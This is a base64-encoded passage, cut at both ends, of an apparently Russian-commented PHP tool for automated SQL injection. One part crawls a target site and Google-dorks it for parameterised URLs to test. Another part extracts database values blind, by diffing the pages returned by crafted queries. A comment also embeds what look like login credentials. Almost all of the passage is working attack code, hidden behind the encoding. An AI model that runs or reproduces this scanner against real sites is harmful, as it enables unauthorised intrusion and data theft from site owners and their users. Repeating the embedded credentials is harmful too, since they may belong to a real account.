CgkgJHJlc1skaV09JHRoaXMtPnNlbmRfeHBsKCR1cmwsICgkZnJvbS0xKSskaSk7Cgl9CgllY2hvICIgW09LXVxyXG48YnI+PGJyPiI7CgkvLyR0aGlzLT5kKCRyZXMsJyRyZXMnKTsKCS8vZXhpdDsKCWZsdXNoKCk7CgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKCWVjaG8gIkdldHRpbmcga2V5d29yZHMiOwoJZm9yKCRpPTE7JGk8PWNvdW50KCRhcnJheSk7JGkrKykKCXsKCQllY2hvICIuIjsKCQkkc3BsaXR0ZWQxID0gc3RyX3NwbGl0KCRyZXNbJGldLCAxMCk7IC8vIFVHTFkgSEFDSwoJCQoJCQoJCS8vJHRoaXMtPmQoJHJlc1skaV0sJyRyZXNbJGldJyk7CgkJLy8kdGhpcy0+ZCgkc3BsaXR0ZWQxLCckc3BsaXR0ZWQxJyk7CgkJLy9leGl0OwoJCQoJCSRrZXlzWyRpXSA9IGFycmF5KCk7CgkJCgkJZm9yKCRqPTE7JGo8PWNvdW50KCRhcnJheSk7JGorKykKCQl7IAoJCQlpZigkaj09JGkpe2NvbnRpbnVlO30KCgkJCSRzcGxpdHRlZDIgPSBzdHJfc3BsaXQoJHJlc1skal0sIDEwKTsgLy8gVUdMWSBIQUNLIAoJCQkKCQkJLy8kdGhpcy0+ZCgkc3BsaXR0ZWQyLCckc3BsaXR0ZWQyJyk7CgkJCQoJCQkKCQkJCgkJCSRkaWZmcyA9IGFycmF5X2RpZmYoJHNwbGl0dGVkMSwgJHNwbGl0dGVkMik7CgkJCQoJCS8vCSR0aGlzLT5kKCRkaWZmcywnJGRpZmZzJyk7CgkJCS8vZXhpdDsKCgkJCSRrZXlzWyRpXSA9IGFycmF5X21lcmdlKCRrZXlzWyRpXSwgJGRpZmZzKTsKCQkJCgkJCS8vZCgka2V5cywna2V5cycpOwoJCQkvL2V4aXQ7CgkJfQoKCQkka2V5c1skaV0gPSBhcnJheV91bmlxdWUoJGtleXNbJGldKTsKCX0KCWVjaG8gIiBbT0tdXHJcbjxicj48YnI+IjsKCS8vJHRoaXMtPmQoJGtleXMsJ2tleXMnKTsKCS8vZXhpdDsKCWZsdXNoKCk7CgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKCWVjaG8gIkZpbHRlcmluZyBrZXl3b3JkcyI7Cglmb3IoJGk9MTskaTw9Y291bnQoJGFycmF5KTskaSsrKQoJewoJCWVjaG8gIi4iOwoJCQoJCWZvcigkaj0xOyRqPD1jb3VudCgkYXJyYXkpOyRqKyspCgkJewkKCQkJaWYoJGo9PSRpKWNvbnRpbnVlOwoJCQkKCQkJJGRpZmZzID0gYXJyYXkoKTsKCQkJJGRpZmZzID0gYXJyYXlfZGlmZigka2V5c1skaV0sICRrZXlzWyRqXSk7CgkJCSRrZXlzWyRpXSA9ICRkaWZmczsKCQl9Cgl9CgllY2hvICIgW09LXVxyXG48YnI+PGJyPiI7CgkvLyR0aGlzLT5kKCRrZXlzLCdrZXlzMicpOwoJCgkvL2V4aXQ7CglmbHVzaCgpOwoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCgllY2hvICJTZW5kaW5nIHF1ZXJpZXMiOwoJJHhwbF9wYWdlcyA9IGFycmF5KCk7CgoJZm9yKCRpPTE7JGk8PSRzeW1ib2xzOyRpKyspIAoJeyAKCSBlY2hvICIuIjsKCSAkeHBsID0gJHRoaXMtPmJ1aWxkX3hwbCgkYXJyYXksICRpKTsKCSBpZigkZnJvbT4xKQoJICAgJHhwbCA9ICgkZnJvbS0xKS4iJTJCIi4keHBsOwoJICR4cGxfcGFnZXNbJGldID0gJHRoaXMtPnNlbmRfeHBsKCR1cmwsICR4cGwpOwoJfQoJZWNobyAiIFtPS11cclxuPGJyPjxicj4iOwoJZmx1c2goKTsKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgoJZWNobyAiR2V0dGluZyB2YWx1ZTogIjsKCWZvcmVhY2goJHhwbF9wYWdlcyBhcyAkeCkKCXsKCSAgZm9yKCRpPTE7JGk8PWNvdW50KCRhcnJheSk7JGkrKykKCSAgewoJCWlmKHN0cnBvcygkeCwka2V5c1skaV1bMF0pIT09ZmFsc2UpCgkJewoJCSAgZWNobyAkYXJyYXlbJGktMV07CgkJICBmbHVzaCgpOwoJCSAgYnJlYWs7CgkJfQoJICB9Cgl9IAoKCWVjaG8gIiBbRE9ORV1cclxuIjsKCgoKCgkKfQoKCQoJCQoJCgkKCQoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy/Qn9CQ0KPQmi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJCgkvL3Bvc3RfdXJsIC0g0Y3RgtC+INC60YPQtNCwINC00LDQvdC90YvQtSDQvtGC0L/RgNCw0LLQu9GP0LXQvAoJLy9nZXRfdG9fdXJsIC0gINCh0JDQmdCiICsgdXVuYW1lPVRlcmtleVZpbnNvbnQmdXBhc3M9VHR5aHF3ZWs4NzIzJnVwYXNzMj1UdHlocXdlazg3MgoJLy9wb3N0ZGF0YSA9INC80LDRgdGB0LjQsiDRgdC+INC30L3QsNGH0LXQvdC40Y/QvNC4INC/0L7RgdGC0LAKCS8vcG9zdHF1ZXJ5IC0g0YfQuNGB0YLRi9C5INC30LDQv9GA0L7RgQoJCglwdWJsaWMgZnVuY3Rpb24gc3RhcnRfY3Jvd2xlcigkdmFsdWU9ImFueWtzdGVuYWkubHQiKXsKCQkKCQkkdmFsdWU9InRlc3RwaHAudnVsbndlYi5jb20iOwoJCgkJCgkJCgkJJHRoaXMtPmQoJHZhbHVlLCdjcm93bGVyJyk7CgkJCgkJJHZhbHVlID0gc3RyX3JlcGxhY2UoYXJyYXkoJ2h0dHA6Ly8nLCdodHRwczovLycpLCcnLCR2YWx1ZSk7CgkJCgkJCgkJCgkJCgkJCgkKCQkkdGhpcy0+Y3Jvd2xlcl91cmwgPSAkdmFsdWU7Ly8g0LfQsNC90L7RgdC40LwgaG9zdCDQsiDQs9C70L7QsdCw0LvRjNC90YPRjiDQv9C10YDQtdC80LXQvdC90YPRjgoJCQoKCQkkdmFsdWUyID0gJ2h0dHA6Ly8nLiR2YWx1ZTsKCQkkcGFycyA9IHBhcnNlX3VybCgkdmFsdWUyKTsKCQkkdGhpcy0+aG9zdF9jcmF3bGVyID0gJHBhcnNbJ2hvc3QnXTsKCQkKCQkKCQkKCQkKCQkkcGFnZSA9NTsKCQkkdGhpcy0+cGFnZSA9IDU7CgkJJHRoaXMtPnRpbWVfYWxsID0gdGltZSgpOwoJCSR0aGlzLT50aW1lMiA9ICR0aGlzLT50aW1lX2Nyb3dsZXI7CgkJJGxpbmtzX3BhcnMgPSBhcnJheSgpOwoJCQoJCQoJCS8vLy8vLy8vLy8vLy8vLy8vIFNURVAgMSAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkJLy8kdGhpcy0+Y3Jvd2xlcl9nb29nbGUoJHZhbHVlKTsvL9C40YnQtdC8INGBINCz0YPQs9C70LAg0LvQuNC90LrQuAoJCS8vJHRoaXMtPmwxX2dvb2dsZSA9IGFycmF5X3NsaWNlKCR0aGlzLT5sMV9nb29nbGUsIDAsIDEwKTsKCQkvLyR0aGlzLT5kKCR0aGlzLT5sMV9nb29nbGUsJyR0aGlzLT5sMV9nb29nbGUnKTsKCQoJCS8vZXhpdDsKCQoJCS8vLy8vLy8vLy8vLy8vLy8vIFNURVAgMiDQmNCp0JXQnCDQktCQ0KnQlSDQktCh0JUg0KEg0JPQm9CQ0JLQndCe0JkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkJJGNyb3dsZXJfbGlua3MgPSAkdGhpcy0+Z2V0X3VybCgkdmFsdWUsdHJ1ZSk7IC8vINC/0LDRgNGB0LjQvCDQstGB0LUg0LvQuNC90LrQuCDRgSDQs9C70LDQstC90L7QuSDRgdGC0YDQsNC90LjRh9C60LgKCQkkY3Jvd2xlcl9saW5rcyA9IGFycmF5X3NsaWNlKCRjcm93bGVyX2xpbmtzLCAwLCAkdGhpcy0+bGltaXRfcGFnZTApOyAvLyDRgNC10LbQuNC8INC/0L4g0LrQvtC70LjRh9C10YHRgtCy0YMg0YHRgdGL0LvQvtC6INGBINCz0LvQsNCy0L3QvtC5INC00LvRjyDRh9GC0LXQvdC40Y8g0LLRgdC10YUg0YHRgdGL0LvQvtC6INCy0LTRgNGD0LMg0YLQsNC8INC10YHRgtGMID8KCQkkdGhpcy0+ZCgkY3Jvd2xlcl9saW5rcywnJGNyb3dsZXJfbGlua3Mgb25lJyk7Ly8g0YHQutC+0Log0YfQtdCz0L4g0YHQvtCx0YDQsNC7INCy0LDRidC1INCz0LvQsNCy0L3QvtC5CgkJCgkKCQkKCQkvLy8vLy8vLy8vLy8vLy8vLyBTVEVQIDMg0JjQqdCV0Jwg0JvQmNCd0JrQmCDQoSBTSVRFTUFQIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCQkkdGhpcy0+c2l0ZW1hcCA9IHRydWU7IC8vINC/0LDRgNGB0LjQvCDQstGB0LUg0LvQuNC90LrQuCBjIHNpdGVtYXAKCQkkY3Jvd2xlcl9saW5rc19tYXAgPSAkdGhpcy0+Z2V0X3VybCgkdmFsdWUuJy9zaXRlbWFwLnhtbCcsdHJ1ZSk7IAoJCSR0aGlzLT5zaXRlbWFwID0gZmFsc2U7CgkJJHRoaXMtPmQoJGNyb3dsZXJfbGlua3NfbWFwLCckY3Jvd2xlcl9saW5rc19tYXAgS0FSVFMnKTsvLyDRgdC60L7QuiDRh9C10LPQviDRgdC+0LHRgNCw0Lsg0LLQsNGJ0LUg0LPQu9Cw0LLQvdC+0LkKCQoJCSRjcm93bGVyX2xpbmtzX2FsbCA9IGFycmF5X21lcmdlKCRjcm93bGVyX2xpbmtzLCAkY3Jvd2xlcl9saW5rc19tYXApOy8v0L7QsdGK0LXQtNC40L3Rj9C10Lwg0LPQu9Cw0LLQvdGD0Y4g0Lggc2l0ZW1hcC54bWwKCQkkdGhpcy0+ZCgkY3Jvd2xlcl9saW5rc19hbGwsJyRjcm93bGVyX2xpbmtzX2FsbCBvbmUgTUFJTitzaXRlbWFwJyk7Ly8g0YHQutC+0Log0YfQtdCz0L4g0YHQvtCx0YDQsNC7INCy0LDRidC1INCz0LvQsNCy0L3QvtC5CgkJCgkJCgkJCgkJaWYoY291bnQoJGNyb3dsZXJfbGlua3NfYWxsKT09MCBBTkQgY291bnQoJHRoaXMtPmwxX2dvb2dsZSk9PTApCgkJewoJCQkkdGhpcy0+ZCgnbm90IGxpbmxzIGdldF91cmwgY3Jvd2xlciBwYWdlMSBhbmQgZ29vZ2xlJyk7CgkJCXJldHVybiBmYWxzZTsKCQl9ZWxzZQoJCXsKCQkJCgkJCS8vLy8vLy8vLy8vLy8vLy8vIFNURVAgNCDQmNCp0JXQoiDQmNCd0KLQldCg0JXQodCd0KvQlSDQn9Ce0JTQpdCe0JTQr9Cp0JjQlSDQmNCc0JXQndCeINCb0JjQndCa0Jgg0KEg0JPQm9CQ0JLQndCe0Jkg0KHQotCg0JDQndCY0KbQqyAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkJCSRsaW5rc19wYXJzID0gYXJyYXkoKTsKCQkJLy/Qs9C70LDQstC90YPRjiDQvtGC0LTQtdC70YzQvdC+K3NpdGVtYXAKCQkJJHRoaXMtPmNyb3dsZXJfcGFyc2VfdXJsX21haW4oJGNyb3dsZXJfbGlua3NfYWxsLDEpOyAKCQkJJHRoaXMtPmQoJHRoaXMtPmwxX21haW4sJ2xpbmtzX3BhcnMg0L/QvtC00YXQvtC00Y/RidC40YUg0YEgPyDQvdCw0LnQtNC10L3QvdGL0LUg0YEg0LPQu9Cw0LLQvdC+0LkgKyBzaXRlbWFwICEhIScpOwoJCQkkdGhpcy0+ZCgkdGhpcy0+bDFfbWFpbl9mb3JtLCdsaW5rc19wYXJzINC00LvRjyBGT1JNUyEhIScpOwoJCQkKCQkKCQkJLy8vLy8vLy8vLy8vLy8vLy8gU1RFUCA1INCY0KnQldCcINCk0J7QoNCc0KsgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJCQkKCQkJCgkJCWlmKGNvdW50KCR0aGlzLT5sMV9tYWluX2Zvcm0pID4gMCl7CgkJCQkKCQkJCWZvcmVhY2goJHRoaXMtPmwxX21haW5fZm9ybSBhcyAkbGlua3NfZm9ybV9jaGVjayl7CgkJCQkJCgkJCQkJJHRoaXMtPmZvcm1fc3RhcnQoJGxpbmtzX2Zvcm1fY2hlY2spOwoJCQkJfQoJCQl9CgkJCQoJCQkKCQkJJHRoaXMtPmQoJysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrJyk7CgkJCQoJCQlleGl0OwoJCQkvL9C00LDQu9C10LUg0LjQtNC10YIg0YEg0LrQsNC20LTQvtC5INC90LDQudC00LXQvdC+0Lkg0YHRgdGL0LvQutGLINGBINCz0LvQsNCy0L3QvtC5INC90LAg0L3QvtCy0YPRjiDRgdGC0YDQsNC90LjRhtGDINC4INGB0L7QsdC40YDQsNC10YIg0YLQsNC8INC10YnQtSDRgdGB0YvQu9C60LgKCQkJJHRoaXMtPmNyb3dsZXJfcGFyc2VfdXJsKCRjcm93bGVyX2xpbmtzLCRwYWdlKTsKCQkJCgkJCgkJCgkJCQoJCQkkbGlua3NfcGFycyA9IGFycmF5X21lcmdlX3JlY3Vyc2l2ZSgkdGhpcy0+bDFfbWFpbiwgJHRoaXMtPmwxLCR0aGlzLT5sMV9nb29nbGUpOy8v0YEg0LPQu9Cw0LLQvdC+0Lkoc2l0ZW1hcCkgK9C60YDQsNCy0LvQtdGACgkJCQoJCQoJCQkKCQkJCgkJCSRsaW5rc19wYXJzID0gYXJyYXlfdW5pcXVlKCRsaW5rc19wYXJzKTsvLyDQtNGD0LHQu9C4INGD0LTQsNC70Y/QtdC8CgkJCSR0aGlzLT5kKCRsaW5rc19wYXJzLCdsaW5rc19wYXJzIE1BSU4rU0lURU1BUCtnb29nbGUnKTsKCQkJCgkJCQoJCQkKCQkJCgkJCS8vJHRoaXMtPmQoJHRoaXMtPmExLCckdGhpcy0+YTEnKTsKCQkJCgkJCQoJCQlpZihjb3VudCgkbGlua3NfcGFyc1swXSk9PTApCgkJCXsKCQkJCSR0aGlzLT5kKCdub3QgbGlubHMgY3Jvd2xlcl9wYXJzZV91cmwgY3Jvd2xlcicpOwoJCQkJcmV0dXJuIGZhbHNlOwoJCQl9ZWxzZQoJCQl7CgkJCQoJCQkJZm9yZWFjaCgkbGlua3NfcGFycyBhcyAkY3Jvd2xlcl9vbmVfdXJsKQoJCQkJewoJCQkJCSR6bmFrID0gZXhwbG9kZSgnPycsJGNyb3dsZXJfb25lX3VybCk7CgkJCQkJCgkJCQkJaWYoJHpuYWtbMV0gIT0nJykKCQkJCQl7CgkJCQkJCSRjcm93bGVyX29uZV91cmwgPSBzdHJfcmVwbGFjZShhcnJheSgnaHR0cDovLycsJ2h0dHBzOi8vJyksJycsJGNyb3dsZXJfb25lX3VybCk7CQoJCQkJCQkka3VbXSA9IHRyaW0oJGNyb3dsZXJfb25lX3VybCk7CgkJCQkJfQoJCQkJCgkJCQl9CgkJCgkJCgkJCgkJCQlzaHVmZmxlKCRrdSk7CgkJCQkka3UgPSBhcnJheV91bmlxdWUoJGt1KTsKCQkJCSRrdSA9IGFycmF5X3NsaWNlKCRrdSwgMCwgMjApOwoJCQkJCgkJCQkkdGhpcy0+ZCgka3UsJ2t1a3VrdWt1Jyk7CgkJCQkKCgkJCQlleGl0OwoJCQkJCgkJCQlmb3JlYWNoKCRrdSBhcyAkY3Jvd2xlcl9vbmVfdXJsMikKCQkJCXsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCQkJCQkjI9GC0LXRgdGC0LjRgNGD0LXQvNGBCQkJCQkKCQkJCQkkdGhpcy0+ZCgkY3Jvd2xlcl9vbmVfdXJsMiwnbmV3IGl0ZXJhdGlvbiB1cmwgY3Jvd2xlcicpOwoJCQkJCQoJCQkJCWlmKCRnZyA9ICR0aGlzLT5pbmpfdGVzdCgkY3Jvd2xlcl9vbmVfdXJsMikpCgkJCQkJewoJCQkJCQlyZXR1cm4gJGNyb3dsZXJfb25lX3VybDIuJzo6OicuJGdnOwoJCQkJCQlicmVhazsKCQkJCQl9CQoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJfQoJCQl9CgkJfQoJCXJldHVybiBmYWxzZTsKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGNyb3dsZXJfZ29vZ2xlKCRkb21lbil7CgkJCgkJJGRvbWVuID0gc3RyX3JlcGxhY2UoJ3d3dy4nLCcnLCRkb21lbik7CgkJCgkJJGlwID0gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107CgkJCgkJCgkJCgkJICR1cmwgPSAiaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvc2VydmljZXMvc2VhcmNoL3dlYj92PTEuMCZxPXNpdGU6JGRvbWVuKytpbnVybDolMjIucGhwJTNGJTIyKyU3QytpbnVybDolMjIlMjYlMjImdXNlcmlwPSRpcCI7CgkJCgkJCgkJICR0aGlzLT5kKCR1cmwsJ3VybCcpOwoJCS8vZXhpdDsgCgkJICRjaCA9IGN1cmxfaW5pdCgpOwoJCSBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCR1cmwpOwoJCSBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiIik7CgkJIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GQUlMT05FUlJPUiwgMSk7CgkJIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOwoJCSBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgImh0dHA6Ly93d3cuZ29vZ2xlLnJ1LyIpOyAKCQkgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKCQkgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOwoJCSBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMTUpOwoJCSBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMCk7CgoJCSRkYXRhID0gY3VybF9leGVjKCRjaCk7CgkJCgkJJGpzb24gPSBqc29uX2RlY29kZSgkZGF0YSk7CgkJCgkJLy8kdGhpcy0+ZCgkanNvbiwnJGpzb24nKTsKCQkKCQkkdGhpcy0+bDFfZ29vZ2xlID0gYXJyYXkoKTsKCQkKCQlpZigkanNvbi0+cmVzcG9uc2VTdGF0dXMgPT0gMjAwKQoJCXsKCQkJCgkJCSR0aGlzLT5kKCdvayAyMDAnKTsKCQkJCgkJCWZvcmVhY2goJGpzb24tPnJlc3BvbnNlRGF0YS0+cmVzdWx0cyBhcyAkdG1wKQoJCQl7CgkJCQkKCQkJCSR0aGlzLT5kKCR0bXAtPnVuZXNjYXBlZFVybCwndW5lc2NhcGVkVXJsJyk7CgkJCQkKCQkJCQkKCQkJCSR0aGlzLT5sMV9nb29nbGVbXSA9IHN0cl9yZXBsYWNlKGFycmF5KCdodHRwOi8vJywnaHR0cHM6Ly8nKSwnJywkdG1wLT51bmVzY2FwZWRVcmwpOwoJCQkJCQoJCQl9CgkJfWVsc2V7CgkJCSR0aGlzLT5kKCdOTyAoKCAyMDAnKTsKCQkJCgkJfQkKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGNyb3dsZXJfcGFyc2VfdXJsX21haW4oJGxpbmtzLCRwYWdlPTEpewoKCQoJCgkKCWlmKCRwYWdlID09MCB8ICR0aGlzLT5saW1pdF9jcmF3bGVyID09MCl7cmV0dXJuO30KCQoJCglmb3JlYWNoICgkbGlua3MgYXMgJGxpbmspCgl7CgkJCgkJCgkJJG5ldyA9IHRpbWUoKTsKCQkkcmF6biA9ICRuZXctJHRoaXMtPnRpbWVfYWxsOwoJCQoJCS8v0YHRgtC+0L/QsNC10Lwg0L/QtdGA0LXQsdC+0YAg0LXRgdC70Lgg0YHQu9C40YjQutC+0Lwg0LTQvtC70LPQviDQuNC00LXRggoJCWlmKCRyYXpuPiR0aGlzLT50aW1lMl9tYWluKXskdGhpcy0+ZCgnVElNRSEhISEgQUxMIE1BSU4hIScpO3JldHVybiBmYWxzZTt9CgkKCQkKCS8vCSRsaW5rID0gc3RyX3JlcGxhY2UoJ2h0dHA6Ly8nLCAnJywgJGxpbmspOwoJCS8vJGxpbmsgPSBzdHJfcmVwbGFjZSgnaHR0cHM6Ly8nLCAnJywgJGxpbmspOwoJCSRsaW5rID0gc3RyX3JlcGxhY2UoJ2FtcDsnLCAnJywgJGxpbmspOwoJCSRsaW5rID0gc3RyX3JlcGxhY2UoJy4uLy4uLycsICcnLCAkbGluayk7CgkJJGxpbmsgPSBzdHJfcmVwbGFjZSgnLi4vJywgJycsICRsaW5rKTsKCQkkbGluayA9IHN0cl9yZXBsYWNlKCcuLycsICcnLCAkbGluayk7CgkJCgkJCgkkdGhpcy0+Y3Jvd2xlcl91cmwgPSBzdHJfcmVwbGFjZSgnaHR0cDovLycsICcnLCAkdGhpcy0+Y3Jvd2xlcl91cmwpOwoJJHRoaXMtPmNyb3dsZXJfdXJsMiA9IHN0cl9yZXBsYWNlKCd3d3cuJywgJycsICR0aGlzLT5jcm93bGVyX3VybCk7CgoJaWYgKHByZWdfbWF0Y2goJy8oZ29vZ2xlKVwuL3NpJywgJGxpbmspKSBjb250aW51ZTsgLy8g0L7RgtC60LjQtNGL0LLQsNC10Lwg0LvQtdCy0YvQtSDRgdGB0YvQu9C60LgKCQkKCQoJCQoJaWYgKHByZWdfbWF0Y2goJy8oLiopLihjc3N8anBnfGdpZnxwbmd8anN8Zmx2fHN3Znxhdml8bXAzfG1wNHxtcmVnfHBkZnxpY298cG5nfGpwZWcpfF4jJC9zaScsICRsaW5rKSkgY29udGludWU7IC8vINC+0YLQutC40LTRi9Cy0LDQtdC8INC70LXQstGL0LUg0YHRgdGL0LvQutC4CgkJCgkJCgkJCgkJJGxpbmtfb2xkID0gJGxpbms7CgkJJGwgPSAkbGluazsKCQkKCQkkbGluayA9IHByZWdfcmVwbGFjZSgnLz0oW14mXSspL3NpJywgJz0nLCAkbGluayk7IC8vINGD0LHQuNGA0LDQtdC8INCy0YHRkSDRh9GC0L4g0L/QvtGB0LvQtSA9INC40LTQtdGCIAoJCQoJCQoJCQoJCWlmICghaW5fYXJyYXkoJGxpbmssICR0aGlzLT5hMV9tYWluKSkKCQl7CgkJCQoJCQkvLyR0aGlzLT5kKCc8PDwgJy4kbGlua19vbGQuIiBsaW5rIGQgcmFib3RlIHBhZ2UgLSAkcGFnZSAiKTsKCQkJCQkKCQkJCgkJCQoJCQkkdGhpcy0+YTFfbWFpbltdID0gJGxpbms7IC8vINCy0LDRidC1INGN0YLQviDQvNCw0YHRgdC40Log0YfRgtC+0LHRiyDQvdC1INC/0L7QstGC0L7RgNGP0YLRjNGB0Y8KCQkJJHRoaXMtPmEyX21haW5bXSA9ICRsaW5rX29sZDsgLy8g0LLQsNGJ0LUg0Y3RgtC+INC80LDRgdGB0LjQuiDRh9GC0L7QsdGLINC90LUg0L/QvtCy0YLQvtGA0Y/RgtGM0YHRjwoJCQkKCQoJCQkJaWYgKHByZWdfbWF0Y2goJy9eKGh0dHA6XC9cL3xodHRwczpcL1wvKT8od3d3Lik/Jy4kdGhpcy0+Y3Jvd2xlcl91cmwyLidcLy9zaScsICRsKSkKCQkJCXsgCgkJCQkJLy8kdGhpcy0+ZCgkbCwnXihodHRwOlwvXC98aHR0cHM6XC9cLyk/KHd3dy4pPyR0aGlzLT5jcm93bGVyX3VybFwvJyk7CgkJCQl9CgkJCQllbHNlaWYocHJlZ19tYXRjaCgnL14oaHR0cDpcL1wvfGh0dHBzOlwvXC8pKyh3d3cuKT8vc2knLCAkbCkpCgkJCQl7IAoJCQkJCS8vJHRoaXMtPmQoJGwsJyhodHRwOlwvXC98aHR0cHM6XC9cLykrKHd3dy4pJyk7CgkJCQl9CgkJCQllbHNlaWYgKHByZWdfbWF0Y2goJy9eXC8vc2knLCAkbCkpCgkJCQl7IAoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLiRsOwkKCQkJCQkvLyR0aGlzLT5kKCRsLCdeJyk7CgkJCQl9CgkJCQllbHNlaWYgKHByZWdfbWF0Y2goJy9eXC4vc2knLCAkbCkpCgkJCQl7CgkJCQkJJGwgPSBzdHJfcmVwbGFjZSgnLi8nLCAnJywgJGwpOwoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLicvJy4kbDsKCQkJCQkvLyR0aGlzLT5kKCRsLCdeXC4vJyk7CgkJCQl9CgkJCQllbHNlaWYgKHByZWdfbWF0Y2goJy9eXD8vc2knLCAkbCkpCgkJCQl7IAoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLiIvIi4kbDsJCgkJCQkJJHRoaXMtPmQoJGwsJ15cPycpOwoJCQkJfQoJCQkJZWxzZWlmIChwcmVnX21hdGNoKCcvXiguKilcLihodG18cGhwfGFzcHxhc3B4fGh0bWx8c2h0bWx8ZG98Y2ZtfGNnaXxwbHx0eHR8YWN0aW9ufGpzfGFzbXh8ZGh0bWx8eGh0bWx8anNwKS9zaScsICRsKSkKCQkJCXsKCQkJCQkkbCA9ICR0aGlzLT5jcm93bGVyX3VybC4nLycuJGw7CgkJCQkJLy8kdGhpcy0+ZCgkbCwnKGh0bXxwaHB8YXNwfGFzcHh8aHRtbHxzaHRtbHxkb3xjZiknKTsKCQkJCX0KCQkJCWVsc2VpZiAocHJlZ19tYXRjaCgnL14oLiopXD89L3NpJywgJGwpKQoJCQkJewoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLicvJy4kbDsKCQkJCQkvLyR0aGlzLT5kKCRsLCdeKC4qKVw/PScpOwoJCQkJCQoJCQkJfWVsc2VpZiAocHJlZ19tYXRjaCgnL14oW2EteiwwLTlfXSkrL3NpJywgJGwpKQoJCQkJewoJCQkJCSRsID0gJHRoaXMtPmNyb3dsZXJfdXJsLicvJy4kbDsKCQkJCQkvLyR0aGlzLT5kKCRsLCcoW2EteiwwLTlfXC9dKScpOwoJCQkJfQoJCQkJCgkJCQoJCQkKCQkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkJCgkJCQoJCQkKCQkJLy9leGl0OwoJCQkKCQkJLy/QvdC10L7QsdGL0YfQvdGL0LUg0LfQsNC80LXQvdGLINC/0YDQvtC40LfQstC+0LTQuNC8CgkJCQoJCQkkbCA9IHN0cl9yZXBsYWNlKCIvLnBocCIsJy9waHAnLCRsKTsKCQkJJGwgPSBzdHJfcmVwbGFjZSgiLy5hc3AiLCcvYXNwJywkbCk7CgkJCSRsID0gc3RyX3JlcGxhY2UoJHRoaXMtPmNyb3dsZXJfdXJsLiIvIi4kdGhpcy0+Y3Jvd2xlcl91cmwsJHRoaXMtPmNyb3dsZXJfdXJsLCRsKTsKCQkJCgkJCS8vJHRoaXMtPmQoJyAtPj4+ICcuJGxpbmtfb2xkLiIoJGwpICIuIiAgbGluayBpdG9nIHBhZ2UgLSAkcGFnZSIpOwoJCQkKCQkJLy/QtdGB0LvQuCDQsiDQtNC+0LzQtdC90LUg0YHQvtC00LXRgNC00LjRgtGB0Y8gaG9zdCDQvdC+INGN0YLQviDQu9C40L3QuiDQvdCwINGN0YLQvtC8INGB0LDQudGC0LUsINCwINC90LUg0YHRgtC+0YDQvtC90LjQuQoJCQlpZiAocHJlZ19tYXRjaCgnL14od3d3Lik/KC4qKT8nLiR0aGlzLT5jcm93bGVyX3VybDIuJy9zaScsICRsKSkKCQkJewoJCQkJCgkJCQoJCQkJJHRoaXMtPmxpbWl0X2NyYXdsZXItLTsKCQkJCS8vJHRoaXMtPmQoJHRoaXMtPmxpbWl0X2NyYXdsZXIpOwoJCQkJCgoJCQkJaWYgKHByZWdfbWF0Y2goJy9cPy9zaScsICRsKSkKCQkJCXsKCQkJCQkKCQkJCQkkdGhpcy0+bGltaXRfY3Jhd2xlci0tOwoJCQkJCgkJCQkJaWYoJHRoaXMtPmxpbWl0X2NyYXdsZXI9PT0wKQoJCQkJCXsKCQkJCQkJJHRoaXMtPmQoJHRoaXMtPmxpbWl0X2NyYXdsZXIsJyR0aGlzLT5saW1pdF9jcmF3bGVyIGxpbWl0IDAhIScpOwoJCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQkJfQoJCQkJCQoJCQkJCSR0aGlzLT5sMV9tYWluW10gPSAkbDsvLyDQuNGC0L7Qs9C+0LLRi9C5INC80LDRgdGB0LjQsiDQu9C40L3QutC+0LIKCQkJCX1lbHNlewoJCQkJCQoJCQkJCSR0aGlzLT5sMV9tYWluX2Zvcm1bXSA9ICRsOy8vINC40YLQvtCz0L7QstGL0Lkg0LzQsNGB0YHQuNCyINC70LjQvdC60L7QsgoJCQkJfQkKCQkJfQkKCQl9Cgl9CgkvL3